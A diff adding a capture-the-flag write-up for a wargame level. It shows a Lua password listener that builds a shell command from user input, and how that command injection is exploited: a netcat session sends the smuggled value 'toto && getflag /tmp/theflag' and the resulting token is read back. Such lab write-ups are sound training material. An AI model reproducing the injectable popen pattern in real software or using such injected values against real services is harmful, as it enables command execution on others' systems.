@@ -1,0 +1,61 @@
+# cat README
+```
+level10@BornToSec:~$ cat README
+There is a backdoor who run on port 5151.
+We can provide you with this script here!
+```
+# cat level10.lua
+```
+level10@BornToSec:~$ cat level10.lua
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+
+  end
+
+  client:close()
+end
+```
+# we can already see the vuln in hash function
+```
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
+# passing userinput inside shell command
+# we just need to connect to the backdoor
+# and inject the getflag cmd
+```
+evel10@BornToSec:~$ nc 127.0.0.1 5151
+Password: toto && getflag /tmp/theflag
+Erf nope..
+```
+# we just need to cat the file
+```
+level10@BornToSec:~$ cat /tmp/theflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+```
